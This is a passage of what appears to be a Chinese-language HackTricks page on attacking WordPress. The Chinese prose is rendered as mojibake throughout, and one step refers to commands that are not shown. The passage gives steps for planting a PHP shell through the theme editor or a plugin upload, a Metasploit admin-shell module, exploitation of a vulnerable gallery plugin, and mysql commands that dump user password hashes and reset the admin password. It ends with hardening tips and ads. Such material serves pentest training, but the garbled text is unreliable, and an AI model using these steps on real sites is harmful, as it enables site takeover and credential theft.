è¿™ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ”»å‡»ï¼Œæ›´åƒæ˜¯ä¸€ä¸ªå¥‡ç‰¹ç‚¹ã€‚åœ¨ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ WordPress æ–‡ä»¶ä¸­çš„ä»»æ„ 1 ä½ã€‚å› æ­¤ï¼Œä½ å¯ä»¥ç¿»è½¬æ–‡ä»¶ `/var/www/html/wp-includes/user.php` ä¸­ä½ç½® `5389` çš„ä½ï¼Œæ¥å°† NOT (`!`) æ“ä½œç½®ä¸º NOPã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **é¢æ¿ RCE**

**ä¿®æ”¹æ­£åœ¨ä½¿ç”¨çš„ä¸»é¢˜ä¸­çš„ php æ–‡ä»¶ï¼ˆéœ€è¦ç®¡ç†å‘˜å‡­è¯ï¼‰**

å¤–è§‚ â†’ ä¸»é¢˜ç¼–è¾‘å™¨ â†’ 404æ¨¡æ¿ï¼ˆå³ä¾§ï¼‰

å°†å†…å®¹æ›´æ”¹ä¸º php shellï¼š

![](<../../.gitbook/assets/image (21) (1) (1).png>)

æœç´¢äº’è”ç½‘ä¸Šå¦‚ä½•è®¿é—®è¯¥æ›´æ–°çš„é¡µé¢ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ éœ€è¦åœ¨è¿™é‡Œè®¿é—®ï¼š[http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½ å¯ä»¥ä½¿ç”¨ï¼š
```
use exploit/unix/webapp/wp_admin_shell_upload
```
è·å–ä¼šè¯ã€‚

## æ’ä»¶ RCE

### PHP æ’ä»¶

å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸ºæ’ä»¶ä¸Šä¼ ã€‚\
ä½¿ç”¨ä»¥ä¸‹ç¤ºä¾‹åˆ›å»ºæ‚¨çš„ php åé—¨ï¼š

![](<../../.gitbook/assets/image (407).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°æ’ä»¶ï¼š

![](<../../.gitbook/assets/image (409).png>)

ä¸Šä¼ æ’ä»¶å¹¶ç‚¹å‡»ç«‹å³å®‰è£…ï¼š

![](<../../.gitbook/assets/image (411).png>)

ç‚¹å‡»ç»§ç»­ï¼š

![](<../../.gitbook/assets/image (412).png>)

è¿™å¯èƒ½çœ‹èµ·æ¥ä»€ä¹ˆéƒ½æ²¡å‘ç”Ÿï¼Œä½†å¦‚æœä½ å»åª’ä½“åº“ï¼Œä½ ä¼šçœ‹åˆ°ä½ çš„ shell å·²ç»ä¸Šä¼ ï¼š

![](<../../.gitbook/assets/image (413).png>)

è®¿é—®å®ƒï¼Œä½ å°†çœ‹åˆ°æ‰§è¡Œåå‘ shell çš„ URLï¼š

![](<../../.gitbook/assets/image (414).png>)

### ä¸Šä¼ å¹¶æ¿€æ´»æ¶æ„æ’ä»¶

**(æ­¤éƒ¨åˆ†æ‘˜è‡ª** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)**)**

æœ‰æ—¶ç™»å½•ç”¨æˆ·æ²¡æœ‰å¯å†™æƒé™æ¥ä¿®æ”¹ WordPress ä¸»é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©â€œæ³¨å…¥ WP æ’ä»¶æ¶æ„â€ä½œä¸ºè·å– web shell çš„æ›¿ä»£ç­–ç•¥ã€‚

å› æ­¤ï¼Œä¸€æ—¦ä½ æœ‰äº† WordPress ä»ªè¡¨æ¿çš„è®¿é—®æƒé™ï¼Œä½ å¯ä»¥å°è¯•å®‰è£…ä¸€ä¸ªæ¶æ„æ’ä»¶ã€‚è¿™é‡Œæˆ‘å·²ç»ä» exploit db ä¸‹è½½äº†æ˜“å—æ”»å‡»çš„æ’ä»¶ã€‚

ç‚¹å‡»[**è¿™é‡Œ**](https://www.exploit-db.com/exploits/36374)ä¸‹è½½æ’ä»¶è¿›è¡Œç»ƒä¹ ã€‚

![](https://i1.wp.com/1.bp.blogspot.com/-Y\_Aw7zSFJZs/XY9pymSjdvI/AAAAAAAAguY/FGyGEzlx9VIqNYyyra9r55IklNmwXwMQwCLcBGAsYHQ/s1600/10.png?w=687\&ssl=1)

æ—¢ç„¶æˆ‘ä»¬æœ‰æ’ä»¶çš„ zip æ–‡ä»¶ï¼Œç°åœ¨æ˜¯ä¸Šä¼ æ’ä»¶çš„æ—¶å€™äº†ã€‚

ä»ªè¡¨æ¿ > æ’ä»¶ > ä¸Šä¼ æ’ä»¶

![](https://i0.wp.com/1.bp.blogspot.com/-FLhqB0I32Mg/XY9pyrlKWAI/AAAAAAAAguU/tofpIetTCv4Mho5y5D\_sDuuokC7mDmKowCLcBGAsYHQ/s1600/11.png?w=687\&ssl=1)

å¦‚å›¾æ‰€ç¤ºæµè§ˆä¸‹è½½çš„ zip æ–‡ä»¶ã€‚

![](https://i2.wp.com/1.bp.blogspot.com/-KMumiwE2Tf0/XY9pzznEI4I/AAAAAAAAguk/BavBJP6plFo8NIpa38oWEKfx0jkOXv3HgCLcBGAsYHQ/s1600/12.png?w=687\&ssl=1)

ä¸€æ—¦åŒ…æˆåŠŸå®‰è£…ï¼Œæˆ‘ä»¬éœ€è¦æ¿€æ´»æ’ä»¶ã€‚

![](https://i2.wp.com/1.bp.blogspot.com/-YrFg94Y2EZs/XY9pzydfLDI/AAAAAAAAgug/AjZyQ6Na8kUUmquJXwoapxcmr2-8nAMwQCLcBGAsYHQ/s1600/13.png?w=687\&ssl=1)

å½“ä¸€åˆ‡è®¾ç½®å¦¥å½“åï¼Œå°±å¯ä»¥å¼€å§‹åˆ©ç”¨äº†ã€‚ç”±äºæˆ‘ä»¬å·²ç»å®‰è£…äº†åä¸ºâ€œreflex-galleryâ€çš„æ˜“å—æ”»å‡»æ’ä»¶ï¼Œå¹¶ä¸”å®ƒå¾ˆå®¹æ˜“è¢«åˆ©ç”¨ã€‚

ä½ å°†åœ¨ Metasploit æ¡†æ¶ä¸­æ‰¾åˆ°è¿™ä¸ªæ¼æ´çš„ exploitï¼Œå› æ­¤åŠ è½½ä»¥ä¸‹æ¨¡å—å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

æ‰§è¡Œä¸Šè¿°å‘½ä»¤åï¼Œä½ å°†è·å¾—ä½ çš„ meterpreter ä¼šè¯ã€‚æ­£å¦‚æœ¬æ–‡æ‰€æè¿°çš„ï¼Œæœ‰å¤šç§æ–¹æ³•å¯ä»¥åˆ©ç”¨åŸºäº WordPress çš„ç½‘ç«™ã€‚

![](https://i1.wp.com/1.bp.blogspot.com/-s6Yblqj-zQ8/XY9pz0qYWAI/AAAAAAAAguo/WXgEBKIB64Ian\_RQWaltbEtdzCNpexKOwCLcBGAsYHQ/s1600/14.png?w=687\&ssl=1)

## åæœŸåˆ©ç”¨

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ç®¡ç†å‘˜å¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## WordPress ä¿æŠ¤

### å®šæœŸæ›´æ–°

ç¡®ä¿ WordPressã€æ’ä»¶å’Œä¸»é¢˜æ˜¯æœ€æ–°çš„ã€‚åŒæ—¶ç¡®è®¤åœ¨ wp-config.php ä¸­å·²å¯ç”¨è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ä¹Ÿè¦**åªå®‰è£…å¯ä¿¡çš„WordPressæ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

* ç§»é™¤é»˜è®¤çš„**admin**ç”¨æˆ·
* ä½¿ç”¨**å¼ºå¯†ç **å’Œ**ä¸¤å› ç´ è®¤è¯ï¼ˆ2FAï¼‰**
* å®šæœŸ**å®¡æŸ¥**ç”¨æˆ·**æƒé™**
* **é™åˆ¶ç™»å½•å°è¯•**ä»¥é˜²æ­¢æš´åŠ›ç ´è§£æ”»å‡»
* é‡å‘½å**`wp-admin.php`**æ–‡ä»¶ï¼Œå¹¶ä¸”åªå…è®¸å†…éƒ¨æˆ–ç‰¹å®šIPåœ°å€è®¿é—®ã€‚

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) æ¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
